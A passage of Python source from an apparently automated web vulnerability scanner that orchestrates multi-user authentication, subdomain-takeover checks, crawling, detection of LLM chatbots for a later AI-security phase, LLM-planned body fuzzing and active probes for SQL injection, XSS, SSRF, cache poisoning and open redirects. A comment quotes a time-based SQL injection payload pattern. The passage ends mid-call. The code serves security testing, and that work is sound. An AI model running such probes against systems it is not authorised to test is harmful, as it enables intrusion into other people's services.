        async def _auth_extra(label: str, creds: dict | None, tag: str) -> None:
            if not creds:
                return
            has_cred = (creds.get("username") or creds.get("password")
                        or creds.get("bearer_token") or creds.get("api_key"))
            if not has_cred:
                return
            if _use_fast_path:
                if creds.get("bearer_token") or creds.get("api_key"):
                    hdr: dict = {}
                    if creds.get("bearer_token"):
                        hdr["Authorization"] = f"Bearer {creds['bearer_token']}"
                    elif creds.get("api_key"):
                        hdr["X-Api-Key"] = creds["api_key"]
                    _extra_identities.append({"label": label, "header": hdr, "cookie": ""})
                    print(f"  [AUTH-{tag}] {label}: static token (fast path)")
                    _cb("auth", {"status": f"{tag}_done", "type": "static"})
                else:
                    print(f"  [AUTH-{tag}] Skipped — fast path can't drive a login form.")
                    _cb("auth", {"status": f"{tag}_skipped", "reason": "fast_path_no_browser"})
                return
            print(f"  [AUTH-{tag}] Authenticating {label}...")
            _cb("auth", {"status": f"authenticating_{tag}", "url": target.url})
            try:
                tgt = ScanTarget(
                    id=f"{target.id}_{tag}",
                    url=target.url,
                    scan_mode=target.scan_mode,
                    credentials={k: creds.get(k, "") for k in ("username", "password") if creds.get(k)},
                    auth_config={
                        **target.auth_config,
                        **({"bearer_token": creds["bearer_token"]} if creds.get("bearer_token") else {}),
                        **({"api_key": creds["api_key"]} if creds.get("api_key") else {}),
                    },
                )
                sess = await authenticate(browser, tgt, router, model)
                hdr = sess.get_auth_header()
                cookies_raw = await sess.page.context.cookies() if sess.page else []
                cookie_str = "; ".join(f"{c['name']}={c['value']}" for c in cookies_raw)
                if sess.page:
                    await sess.page.close()
                _extra_identities.append({"label": label, "header": hdr, "cookie": cookie_str})
                print(f"  [AUTH-{tag}] {label} auth type: {sess._auth_type}")
                _cb("auth", {"status": f"{tag}_done", "type": sess._auth_type})
            except Exception as e:
                print(f"  [AUTH-{tag}] {label} auth failed (non-fatal): {e}")
                _cb("auth", {"status": f"{tag}_failed", "error": str(e)})

        await _auth_extra("User B", target.credentials_b, "user_b")
        await _auth_extra("Admin", target.credentials_admin, "admin")
        await _auth_extra("Tenant B", target.credentials_tenant_b, "tenant_b")

        has_user_b = any(i["label"] == "User B" for i in _extra_identities)
        user_b_auth_header = next((i["header"] for i in _extra_identities if i["label"] == "User B"), {})
        user_b_cookie_str = next((i["cookie"] for i in _extra_identities if i["label"] == "User B"), "")

        # ── Pre-connect DNS takeover check ──────────────────────────
        # Before trying HTTP, resolve the target's CNAME chain. If the
        # target itself is a dangling subdomain (NXDOMAIN + CNAME to a
        # claimable provider), emit the finding and short-circuit — there
        # is no HTTP service to scan.
        target_host = urlparse(target.url).hostname or ""
        _takeover_short_circuit = False
        try:
            cname_chain, is_nxdomain = await _resolve_cname(target_host)
            if cname_chain or is_nxdomain:
                matched_providers = _match_provider(cname_chain, target_host)
                if matched_providers and is_nxdomain:
                    for prov in matched_providers:
                        tr = TakeoverResult(
                            hostname=target_host,
                            vulnerable=True,
                            service=prov.service,
                            evidence=(
                                f"CNAME chain: {' -> '.join(cname_chain) or target_host} "
                                f"resolves to NXDOMAIN. The CNAME target matches "
                                f"{prov.service} which is claimable."
                            ),
                            cname_chain=cname_chain,
                            severity=prov.severity,
                            confidence="High",
                        )
                        for f in build_takeover_findings([tr]):
                            findings.append(f)
                            _cb("finding", {**f, "phase": "Pre-Connect DNS Check"})
                    print(f"  [DNS] Subdomain takeover: {target_host} -> NXDOMAIN "
                          f"(CNAME: {' -> '.join(cname_chain)}), "
                          f"provider: {', '.join(p.service for p in matched_providers)}")
                    _cb("progress_msg", {
                        "message": f"Target {target_host} is a dangling subdomain "
                                   f"(takeover possible via {matched_providers[0].service}). "
                                   f"No HTTP service to scan."
                    })
                    _takeover_short_circuit = True
                elif is_nxdomain and not cname_chain:
                    tr = TakeoverResult(
                        hostname=target_host,
                        vulnerable=True,
                        service="Unknown (dangling DNS)",
                        evidence=(
                            f"{target_host} resolves to NXDOMAIN with no CNAME. "
                            f"The DNS record is orphaned — potential takeover if "
                            f"the domain registration lapses or a wildcard is present."
                        ),
                        cname_chain=[],
                        severity="Medium",
                        confidence="Medium",
                    )
                    for f in build_takeover_findings([tr]):
                        findings.append(f)
                        _cb("finding", {**f, "phase": "Pre-Connect DNS Check"})
                    print(f"  [DNS] {target_host} -> NXDOMAIN (no CNAME, orphaned record)")
                elif cname_chain and not is_nxdomain and matched_providers:
                    logger.info("CNAME chain for %s matches %s but host resolves — not dangling",
                                target_host, [p.service for p in matched_providers])
        except Exception as e:
            logger.debug("Pre-connect DNS check failed (non-fatal): %s", e)

        if _takeover_short_circuit:
            metrics["phases_completed"] = 1
            metrics["phase_log"].append({
                "phase": 1, "name": "Pre-Connect DNS Takeover",
                "findings": len(findings), "tool_calls": 0,
                "skipped_reason": "target_is_dangling_subdomain",
            })
            if hasattr(http_client, "aclose"):
                await http_client.aclose()
            if browser:
                await browser.close()
            return findings, metrics

        # ── Navigate to target & wait for SPA readiness (generic) ────
        landed_on_target = False
        if _use_fast_path:
            # No browser to navigate; treat as landed so downstream passive
            # recon runs (in its HTTP-only variant below).
            landed_on_target = True
        try:
            if _use_fast_path:
                pass  # browser navigation not applicable
            else:
                landed_on_target = await _ensure_on_target(page, target.url, target_host)
            if _use_fast_path:
                pass
            elif not landed_on_target and getattr(auth_session, "captcha_detected", False):
                print(f"  [AUTH] CAPTCHA was detected — skipping retry loop")
                landed_on_target = await _ensure_on_target(page, target.url, target_host)
            elif not landed_on_target:
                # Auth didn't redirect to target. Re-authenticate with full flow.
                print(f"  [AUTH-RETRY] Not on target after auth, re-authenticating...")
                _cb("auth", {"status": "re-authenticating", "reason": "not_on_target"})
                for retry in range(2):
                    try:
                        retry_result = await auth_session._refresh_fn()
                        if retry_result.success:
                            print(f"  [AUTH-RETRY] Re-auth attempt {retry+1} succeeded")
                            fresh_cookies = await page.context.cookies()
                            cookie_dict = {c["name"]: c["value"] for c in fresh_cookies}
                            await http_client.aclose()
                            http_client = httpx.AsyncClient(
                                headers=auth_session.get_auth_header(),
                                cookies=cookie_dict,
                                timeout=30.0,
                            )
                            tools._http_client = http_client
                        else:
                            print(f"  [AUTH-RETRY] Re-auth attempt {retry+1} failed")
                    except Exception as auth_err:
                        print(f"  [AUTH-RETRY] Re-auth attempt {retry+1} error: {auth_err}")
                    landed_on_target = await _ensure_on_target(page, target.url, target_host)
                    if landed_on_target:
                        print(f"  [AUTH-RETRY] Successfully landed on target after retry {retry+1}")
                        break
                    await asyncio.sleep(3)

            if _use_fast_path:
                pass  # no browser — nothing to wait on
            elif landed_on_target:
                await _wait_for_spa_ready(page)
                print(f"  [PASSIVE] Page ready on {urlparse(page.url or '').hostname}, "
                      f"network JS captured: {len(network_js_urls)}")
            else:
                current_url = page.url or ""
                current_host = urlparse(current_url).hostname or ""
                print(f"  [PASSIVE] WARNING: Still on {current_host}, NOT on {target_host}!")
                print(f"  [PASSIVE] Current URL: {current_url[:200]}")
                try:
                    title = await page.title()
                    print(f"  [PASSIVE] Page title: {title}")
                except Exception:
                    pass
                browser_cookies = await page.context.cookies()
                from scanners.ai_agent.auth import _extract_root_domain
                root_dom = _extract_root_domain(target_host)
                target_cookies = [c for c in browser_cookies if root_dom in c.get("domain", "")]
                print(f"  [PASSIVE] Browser cookies: {len(browser_cookies)} total, {len(target_cookies)} for *{root_dom}")
                if target_cookies:
                    print(f"  [PASSIVE] Target cookie names: {', '.join(c['name'] for c in target_cookies[:10])}")
                print(f"  [PASSIVE] Authentication likely failed — passive recon may have limited results")
                print(f"  [PASSIVE] TIP: Ensure cookies are from an authenticated session on {target_host} (not the login page)")
                _cb("auth", {"status": "failed_redirect", "current_host": current_host, "target_host": target_host,
                             "current_url": current_url[:200], "browser_cookies": len(browser_cookies),
                             "target_cookies": len(target_cookies)})
        except Exception as e:
            logger.warning("Pre-recon navigation failed (non-fatal): %s", e)

        # Detect app type AFTER navigation (not on the login page)
        if _use_fast_path:
            # Pure API scan -- no SPA/framework detection needed.
            app_info = {"is_spa": False, "framework": "api_only", "has_websockets": False}
        else:
            app_info = await detect_app_type(page)

        # Detect LLM-powered features (chatbot, AI assistant, etc.)
        try:
            _network_log = []
            if hasattr(tools, "get_network_log_raw"):
                _network_log = tools.get_network_log_raw()
            llm_info = await detect_llm_features(
                page=page, http_client=http_client,
                network_log=_network_log,
            )
            app_info.update(llm_info)
        except Exception as e:
            logger.debug("LLM feature detection failed (non-fatal): %s", e)

        print(f"  [DETECT] SPA: {app_info.get('is_spa')}, Framework: {app_info.get('framework')}, WebSockets: {app_info.get('has_websockets')}, LLM Chat: {app_info.get('has_llm_chat', False)}")
        _cb("detect", {"is_spa": app_info.get("is_spa"), "framework": app_info.get("framework"), "has_llm_chat": app_info.get("has_llm_chat", False)})

        def _passive_progress(event, data):
            if event == "out_of_scope":
                _cb("out_of_scope", data)
                return
            _cb("tool_call", {
                "phase": "Passive Reconnaissance",
                "tool": f"passive_{event}",
                "request": data,
                "response": {},
            })

        _phase_seq = 0

        def _next_phase():
            nonlocal _phase_seq
            _phase_seq += 1
            return _phase_seq

        p = _next_phase()
        _cb("phase_start", {"phase": p, "total": 0, "name": "Passive Reconnaissance", "id": "passive_recon"})
        tech_fingerprint = {}
        _skip_tls_siblings = getattr(target, "skip_passive_sibling_tls", False)
        if _use_fast_path:
            print("  [PASSIVE] Running HTTP-only passive reconnaissance...")
            try:
                passive_findings, tech_fingerprint = await run_http_only_passive_recon(
                    http_client=http_client,
                    target_url=target.url,
                    on_finding=lambda f: _cb("finding", {**f, "phase": "Passive Reconnaissance"}),
                    on_progress=_passive_progress,
                    skip_tls_sibling_discovery=_skip_tls_siblings,
                )
                findings.extend(passive_findings)
                if tech_fingerprint.get("technologies"):
                    tech_names = ", ".join(tech_fingerprint["technologies"].keys())
                    print(f"  [PASSIVE] Done: {len(passive_findings)} findings | Detected: {tech_names}")
                else:
                    print(f"  [PASSIVE] Done: {len(passive_findings)} findings")
            except Exception as e:
                passive_findings = []
                print(f"  [PASSIVE] Failed (non-fatal): {e}")
                logger.warning("HTTP-only passive recon failed: %s", e, exc_info=True)
        else:
            current_host = urlparse(page.url or "").hostname or ""
            if current_host != target_host and target_host:
                print(f"  [PASSIVE] SKIPPING — browser on {current_host}, not target {target_host}")
                print(f"  [PASSIVE] Will retry after LLM navigates to target")
                passive_findings = []
                _cb("phase_end", {"phase": p, "name": "Passive Reconnaissance (skipped — not on target)",
                                  "tool_calls": 0, "findings": 0})
            else:
                print("  [PASSIVE] Running passive reconnaissance...")
                try:
                    passive_result = await run_passive_recon(
                        page=page,
                        http_client=http_client,
                        target_url=target.url,
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Passive Reconnaissance"}),
                        on_progress=_passive_progress,
                        network_js_urls=network_js_urls,
                        skip_tls_sibling_discovery=_skip_tls_siblings,
                    )
                    if isinstance(passive_result, tuple):
                        passive_findings, tech_fingerprint = passive_result
                    else:
                        passive_findings = passive_result
                    findings.extend(passive_findings)
                    if tech_fingerprint.get("technologies"):
                        tech_names = ", ".join(tech_fingerprint["technologies"].keys())
                        print(f"  [PASSIVE] Done: {len(passive_findings)} findings | Detected: {tech_names}")
                    else:
                        print(f"  [PASSIVE] Done: {len(passive_findings)} findings")
                except Exception as e:
                    passive_findings = []
                    print(f"  [PASSIVE] Failed (non-fatal): {e}")
                    logger.warning("Passive recon failed: %s", e, exc_info=True)

        _cb("phase_end", {"phase": p, "name": "Passive Reconnaissance",
                          "tool_calls": 0, "findings": len(passive_findings)})

        # ── SPA Crawl (browser-only; harvests XHR/fetch endpoints) ──
        if page is not None and target.scan_mode in ("website", "both"):
            try:
                from .spa_crawler import run_spa_crawl
                p = _next_phase()
                _cb("phase_start", {"phase": p, "total": 0,
                                    "name": "SPA Crawl", "id": "spa_crawl"})

                def _spa_progress(event, data):
                    _cb("progress_msg", {"message": f"[SPA] {event}: {data}"})

                def _spa_oos(rec):
                    _cb("out_of_scope", {**rec, "phase": "SPA Crawl"})

                spa_endpoints, spa_oos = await run_spa_crawl(
                    page=page,
                    target_url=target.url,
                    target_host=urlparse(target.url).hostname or "",
                    extra_domains=extra_domains or [],
                    on_progress=_spa_progress,
                    on_out_of_scope=_spa_oos,
                )
                if spa_endpoints:
                    registry.add(spa_endpoints)
                    for ep in spa_endpoints:
                        if ep.url and ep.url not in metrics["pages_list"]:
                            metrics["pages_list"].append(ep.url)
                            metrics["pages_crawled"] += 1
                            _cb("crawl", {"url": ep.url, "type": "api",
                                          "tool": "spa_crawl",
                                          "count": metrics["pages_crawled"]})
                print(f"  [SPA] Added {len(spa_endpoints)} new endpoints to registry "
                      f"({len(spa_oos)} out-of-scope)")
                _cb("phase_end", {"phase": p, "name": "SPA Crawl",
                                  "tool_calls": 0, "findings": 0,
                                  "details": {
                                      "endpoints_discovered": len(spa_endpoints),
                                      "out_of_scope_hosts": len(spa_oos),
                                  }})
            except Exception as e:
                print(f"  [SPA] Failed (non-fatal): {e}")
                logger.warning("SPA crawl failed: %s", e, exc_info=True)

        # ── Extract <a href> URLs with query params from the live page ──
        # The SPA crawl captures XHR/fetch traffic but misses regular HTML
        # links. This programmatic extraction ensures URL parameters hidden
        # in <a href> (e.g. ?key=, ?style=) are discovered regardless of
        # whether the LLM clicks them during recon.
        if page is not None:
            try:
                href_urls = await page.evaluate(
                    "() => [...document.querySelectorAll('a[href]')]"
                    ".map(a => a.href).filter(h => h.startsWith('http'))"
                )
                _href_added = 0
                for href in (href_urls or []):
                    if not _is_in_scope(href, allowed_domains):
                        continue
                    if href not in metrics["pages_list"]:
                        metrics["pages_list"].append(href)
                        metrics["pages_crawled"] += 1
                        _cb("crawl", {"url": href, "type": "page",
                                      "tool": "href_extract",
                                      "count": metrics["pages_crawled"]})
                        _href_added += 1
                if _href_added:
                    print(f"  [HREF] Extracted {_href_added} link URLs from page")
            except Exception as e:
                logger.debug("href extraction failed (non-fatal): %s", e)

        # ── Post-crawl LLM re-detection ──────────────────────────────
        # The initial detect_llm_features() only sees the landing page.
        # SPAs like ai.norton.com hide chatbots behind sidebar navigation
        # (e.g. "Chat with Superparent").  After the SPA crawl + href
        # extraction we have a richer view of the app, so we re-check:
        #   1. Network endpoints discovered during crawl
        #   2. Crawled page URLs that hint at chat/AI features
        #   3. Navigate to chat-like pages and re-run DOM detection
        if page is not None and not app_info.get("has_llm_chat", False):
            from .llm_detect import match_llm_endpoints_from_urls
            _crawled = list(metrics.get("pages_list", []))
            if hasattr(tools, "_crawled_urls"):
                _crawled.extend(tools._crawled_urls)
            if hasattr(tools, "get_network_log_raw"):
                _crawled.extend(e.get("url", "") for e in tools.get_network_log_raw())
            _chat_hints = [u for u in _crawled if any(
                kw in u.lower() for kw in (
                    "chat", "copilot", "assist", "ai/", "/ask",
                    "converse", "superparent", "bot", "/llm",
                    "/rag", "/generate", "/completions",
                )
            )]
            _api_llm = match_llm_endpoints_from_urls(_crawled)

            if _chat_hints or _api_llm:
                print(f"  [LLM-REDETECT] Found chat hints in crawled URLs: {_chat_hints[:5]}")
                if _api_llm:
                    app_info.setdefault("llm_endpoints", []).extend(_api_llm)
                    app_info["has_llm_chat"] = True
                    app_info["confidence"] = max(app_info.get("confidence", 0), 0.7)
                    print(f"  [LLM-REDETECT] LLM endpoints found: {_api_llm[:3]}")
                for hint_url in _chat_hints[:3]:
                    try:
                        await page.goto(hint_url, wait_until="domcontentloaded", timeout=12000)
                        await page.wait_for_timeout(2000)
                        _network_log2 = []
                        if hasattr(tools, "get_network_log_raw"):
                            _network_log2 = tools.get_network_log_raw()
                        llm_recheck = await detect_llm_features(
                            page=page, http_client=http_client,
                            network_log=_network_log2,
                        )
                        if llm_recheck.get("has_llm_chat"):
                            app_info.update(llm_recheck)
                            print(f"  [LLM-REDETECT] Chat UI detected on {hint_url}! "
                                  f"(confidence={llm_recheck['confidence']:.2f})")
                            break
                    except Exception as e:
                        logger.debug("LLM re-detect navigation to %s failed: %s", hint_url, e)
                if app_info.get("has_llm_chat"):
                    _cb("detect", {
                        "is_spa": app_info.get("is_spa"),
                        "framework": app_info.get("framework"),
                        "has_llm_chat": True,
                    })
                    _cb("progress_msg", {
                        "message": "LLM/chatbot features detected after SPA crawl — "
                                   "LLM security phase will be added",
                    })
            else:
                # Also check sidebar/nav links for chat-like entries
                try:
                    _nav_links = await page.evaluate("""() => {
                        const links = [...document.querySelectorAll('a, button, [role="menuitem"], nav a')];
                        return links
                            .map(el => ({text: (el.textContent || '').trim().toLowerCase(),
                                         href: el.href || ''}))
                            .filter(l => ['chat', 'copilot', 'assistant', 'ai ', 'ask ', 'bot']
                                .some(kw => l.text.includes(kw)));
                    }""")
                    if _nav_links:
                        print(f"  [LLM-REDETECT] Found {len(_nav_links)} chat-like nav elements: "
                              f"{[l['text'][:30] for l in _nav_links[:3]]}")
                        for link in _nav_links[:2]:
                            link_href = link.get("href", "")
                            if link_href and link_href.startswith("http"):
                                try:
                                    await page.goto(link_href, wait_until="domcontentloaded", timeout=12000)
                                    await page.wait_for_timeout(2000)
                                    _net = tools.get_network_log_raw() if hasattr(tools, "get_network_log_raw") else []
                                    llm_recheck = await detect_llm_features(
                                        page=page, http_client=http_client,
                                        network_log=_net,
                                    )
                                    if llm_recheck.get("has_llm_chat"):
                                        app_info.update(llm_recheck)
                                        print(f"  [LLM-REDETECT] Chat UI confirmed via nav link!")
                                        _cb("detect", {
                                            "is_spa": app_info.get("is_spa"),
                                            "framework": app_info.get("framework"),
                                            "has_llm_chat": True,
                                        })
                                        _cb("progress_msg", {
                                            "message": "LLM/chatbot features detected via navigation — "
                                                       "LLM security phase will be added",
                                        })
                                        break
                                except Exception as e:
                                    logger.debug("LLM re-detect nav click to %s failed: %s", link_href, e)
                except Exception as e:
                    logger.debug("LLM nav-link detection failed (non-fatal): %s", e)

        # ── Baseline Execution (happy path, no LLM) ──
        baseline_context = ""
        api_endpoints = registry.get_all()
        if api_endpoints:
            from .baseline_executor import run_baseline, format_baseline_for_llm
            print(f"  [BASELINE] Running happy path for {len(api_endpoints)} API endpoints...")
            p = _next_phase()
            _cb("phase_start", {"phase": p, "total": 0, "name": "API Baseline (Happy Path)", "id": "baseline"})

            def _baseline_progress(event, data):
                if event == "baseline_request":
                    _cb("tool_call", {
                        "phase": "API Baseline (Happy Path)",
                        "tool": "baseline_request",
                        "request": {"method": data["method"], "url": data["url"], "step": f"{data['step']}/{data['total']}"},
                        "response": {},
                    })
                elif event == "baseline_result":
                    _cb("tool_call", {
                        "phase": "API Baseline (Happy Path)",
                        "tool": "baseline_response",
                        "request": {"name": data["name"]},
                        "response": {"status": str(data["status"]), "success": str(data["success"]),
                                     "timing_ms": str(data["timing_ms"]),
                                     "variables": ", ".join(data["variables"]) if data["variables"] else "-"},
                    })

            collection_vars = {}
            for ep in api_endpoints:
                collection_vars.update(ep.variables)

            baseline_results = await run_baseline(
                api_endpoints,
                variables=collection_vars,
                on_progress=_baseline_progress,
            )
            baseline_context = format_baseline_for_llm(baseline_results)
            successful = sum(1 for r in baseline_results if r.success)
            print(f"  [BASELINE] Done: {successful}/{len(baseline_results)} succeeded")
            _cb("phase_end", {
                "phase": p, "name": "API Baseline (Happy Path)",
                "tool_calls": len(baseline_results) * 2,
                "findings": 0,
            })
            metrics["total_tool_calls"] += len(baseline_results) * 2
            for r in baseline_results:
                if r.url and r.url not in metrics["pages_list"]:
                    metrics["pages_list"].append(r.url)
                    metrics["pages_crawled"] += 1
                    _cb("crawl", {"url": r.url, "type": "api", "tool": "baseline", "count": metrics["pages_crawled"]})

        # ── Hybrid Body Fuzzing (LLM plans, engine executes) ──
        # Skip entirely under the ``crawl_only`` scan profile — body fuzzing
        # sends attack payloads, which crawl_only is documented as never doing.
        body_fuzz_context = ""
        _scan_profile_eff = getattr(target, "scan_profile", "vulnerability_scan")
        if (
            baseline_context
            and baseline_results
            and _scan_profile_eff != "crawl_only"
        ):
            from .body_fuzzer import fuzz_body, format_fuzz_results_for_llm as fmt_fuzz
            post_endpoints = [r for r in baseline_results if r.success and r.request_body and r.method in ("POST", "PUT", "PATCH")]
            if post_endpoints:
                fuzz_mode = "hybrid (LLM-planned)" if router else "static"
                print(f"  [BODY-FUZZ] Fuzzing {len(post_endpoints)} endpoint(s) — {fuzz_mode} mode...")
                p = _next_phase()
                _cb("phase_start", {"phase": p, "total": 0, "name": f"Body Fuzzing ({fuzz_mode})", "id": "body_fuzz"})
                all_fuzz_results = []
                all_llm_findings = []
                for br in post_endpoints:
                    def _fuzz_progress(event, data):
                        if event == "fuzz_request":
                            _cb("tool_call", {
                                "phase": f"Body Fuzzing ({fuzz_mode})",
                                "tool": "body_fuzz",
                                "request": {"field": data["field"], "payload": data["payload"],
                                            "step": f"{data['request_num']}/{data['total']}"},
                                "response": {},
                            })
                        elif event == "llm_planning":
                            _cb("tool_call", {
                                "phase": f"Body Fuzzing ({fuzz_mode})",
                                "tool": "llm_payload_planning",
                                "request": {"fields": data["fields_count"], "mode": data["mode"]},
                                "response": {},
                            })
                    try:
                        fuzz_results, ep_llm_findings = await fuzz_body(
                            http_client, br.method, br.url, br.request_body,
                            headers=br.request_headers, on_progress=_fuzz_progress,
                            llm_router=router, llm_model=model,
                        )
                        all_fuzz_results.extend(fuzz_results)
                        all_llm_findings.extend(ep_llm_findings)
                    except Exception as fuzz_err:
                        logger.warning("Body fuzzing failed for %s %s: %s", br.method, br.url, fuzz_err)
                        print(f"  [BODY-FUZZ] Skipping {br.method} {br.url}: {fuzz_err}")
                body_fuzz_context = fmt_fuzz(all_fuzz_results, all_llm_findings)
                anomalies = sum(1 for r in all_fuzz_results if r.anomaly)
                llm_issues = len(all_llm_findings)
                print(f"  [BODY-FUZZ] Done: {len(all_fuzz_results)} tests, {anomalies} anomalies, {llm_issues} LLM-identified API issues")

                for lf in all_llm_findings:
                    findings.append({
                        "title": lf.title,
                        "severity": lf.severity,
                        "url": target.url,
                        "parameter": lf.field,
                        "evidence": lf.evidence,
                        "payload": lf.payload,
                        "owasp_category": "",
                        "source": "body_fuzzer_llm_analysis",
                        "explanation": lf.explanation,
                        "finding_type": lf.finding_type,
                    })
                    _cb("finding", {
                        "title": lf.title, "severity": lf.severity,
                        "url": target.url, "parameter": lf.field,
                        "evidence": lf.evidence, "payload": lf.payload,
                        "phase": "Body Fuzzing",
                        "explanation": lf.explanation,
                    })

                _cb("phase_end", {
                    "phase": p, "name": f"Body Fuzzing ({fuzz_mode})",
                    "tool_calls": len(all_fuzz_results), "findings": anomalies + llm_issues,
                })
                metrics["total_tool_calls"] += len(all_fuzz_results)

        phases = get_phases(
            target.scan_mode,
            app_info,
            scan_scope=getattr(target, "scan_scope", "directory"),
            focus_areas=getattr(target, "focus_areas", None),
            scan_profile=getattr(target, "scan_profile", "vulnerability_scan"),
        )

        # ── Active Baseline: Bare-Root SQLi probe ─────────────────────
        # Deterministic, non-LLM check that catches the
        # ``GET /?"+IF(...,SLEEP(5),NULL)+"`` family of bugs (Avira
        # bug-bounty class). The LLM-driven SQLi phase reasons about
        # named query/body parameters and reliably misses the bare-root
        # raw-query-string injection point. This probe runs once over
        # all in-scope hosts, deduplicated against the global findings
        # buffer, before the parallel OWASP phases kick off so the
        # finding survives even if the SQLi worker dies (which it did
        # for the 07-May-2026 Avira scan due to a ws_connect timeout).
        if (
            getattr(target, "scan_profile", "vulnerability_scan") != "crawl_only"
            and any(p.id == "web_a03_sqli" for p in phases)
        ):
            try:
                ab_hosts: set[str] = set()
                for url in metrics.get("pages_list", []) or []:
                    try:
                        host = (urlparse(url).hostname or "").lower()
                    except Exception:
                        continue
                    if host and _is_in_scope(url, allowed_domains):
                        ab_hosts.add(host)
                target_host = (urlparse(target.url).hostname or "").lower()
                if target_host:
                    ab_hosts.add(target_host)

                if ab_hosts:
                    p = _next_phase()
                    _cb("phase_start", {
                        "phase": p, "total": 0,
                        "name": "Active Baseline (Bare-Root SQLi)",
                        "id": "active_baseline_sqli",
                    })

                    def _ab_progress(event, data):
                        _cb("progress_msg", {"message": f"[ACTIVE-BASELINE] {event}: {data}"})

                    ab_findings = await run_bare_root_sqli_probe(
                        http_client,
                        sorted(ab_hosts),
                        crawled_urls=metrics.get("pages_list") or [],
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (SQLi)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(ab_findings)
                    _cb("phase_end", {
                        "phase": p,
                        "name": "Active Baseline (Bare-Root SQLi)",
                        "tool_calls": len(ab_hosts) * 5,
                        "findings": len(ab_findings),
                    })
                    if ab_findings:
                        print(
                            f"  [ACTIVE-BASELINE] Bare-root SQLi: "
                            f"{len(ab_findings)} finding(s) across "
                            f"{len(ab_hosts)} hosts"
                        )
                    else:
                        print(
                            f"  [ACTIVE-BASELINE] Bare-root SQLi: "
                            f"no hits across {len(ab_hosts)} hosts"
                        )

                    # ── Cache Poisoning probe ────────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (Cache Poisoning)", "id": "active_baseline_cache"})
                    cp_findings = await run_cache_poisoning_probe(
                        http_client,
                        sorted(ab_hosts),
                        crawled_urls=metrics.get("pages_list") or [],
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (Cache Poisoning)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(cp_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (Cache Poisoning)",
                                      "tool_calls": len(ab_hosts) * 7, "findings": len(cp_findings)})
                    if cp_findings:
                        print(f"  [ACTIVE-BASELINE] Cache Poisoning: {len(cp_findings)} finding(s)")

                    # ── Reflected XSS probe ──────────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (Reflected XSS)", "id": "active_baseline_xss"})
                    xss_findings = await run_reflected_xss_probe(
                        http_client,
                        sorted(ab_hosts),
                        crawled_urls=metrics.get("pages_list") or [],
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (Reflected XSS)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(xss_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (Reflected XSS)",
                                      "tool_calls": len(ab_hosts) * 8, "findings": len(xss_findings)})
                    if xss_findings:
                        print(f"  [ACTIVE-BASELINE] Reflected XSS: {len(xss_findings)} finding(s)")

                    # ── DOM XSS probe (Playwright) ─────────────────
                    if browser is not None:
                        p = _next_phase()
                        _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (DOM XSS)", "id": "active_baseline_dom_xss"})
                        dom_xss_findings = await run_dom_xss_probe(
                            browser,
                            sorted(ab_hosts),
                            crawled_urls=metrics.get("pages_list") or [],
                            on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (DOM XSS)"}),
                            on_progress=_ab_progress,
                            cancel_flag=cancel_flag,
                        )
                        findings.extend(dom_xss_findings)
                        _cb("phase_end", {"phase": p, "name": "Active Baseline (DOM XSS)",
                                          "tool_calls": len(ab_hosts) * 10, "findings": len(dom_xss_findings)})
                        if dom_xss_findings:
                            print(f"  [ACTIVE-BASELINE] DOM XSS: {len(dom_xss_findings)} finding(s)")

                    # ── SSRF Bypass probe ────────────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (SSRF Bypass)", "id": "active_baseline_ssrf"})
                    ssrf_findings = await run_ssrf_probe(
                        http_client,
                        sorted(ab_hosts),
                        crawled_urls=metrics.get("pages_list") or [],
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (SSRF Bypass)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(ssrf_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (SSRF Bypass)",
                                      "tool_calls": len(ab_hosts) * 10, "findings": len(ssrf_findings)})
                    if ssrf_findings:
                        print(f"  [ACTIVE-BASELINE] SSRF Bypass: {len(ssrf_findings)} finding(s)")

                    # ── Open Redirect probe ───────────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (Open Redirect)", "id": "active_baseline_redirect"})
                    redirect_findings = await run_open_redirect_probe(
                        http_client,
                        sorted(ab_hosts),
                        crawled_urls=metrics.get("pages_list") or [],
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (Open Redirect)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(redirect_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (Open Redirect)",
                                      "tool_calls": len(ab_hosts) * 6, "findings": len(redirect_findings)})
                    if redirect_findings:
                        print(f"  [ACTIVE-BASELINE] Open Redirect: {len(redirect_findings)} finding(s)")

                    # ── Sensitive Path probe ──────────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (Sensitive Paths)", "id": "active_baseline_paths"})
                    path_findings = await run_sensitive_path_probe(
                        http_client,
                        sorted(ab_hosts),
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (Sensitive Paths)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(path_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (Sensitive Paths)",
                                      "tool_calls": len(ab_hosts) * 20, "findings": len(path_findings)})
                    if path_findings:
                        print(f"  [ACTIVE-BASELINE] Sensitive Paths: {len(path_findings)} finding(s)")

                    # ── Salesforce Misconfig probe ────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (Salesforce)", "id": "active_baseline_salesforce"})
                    sf_findings = await run_salesforce_probe(
                        http_client,
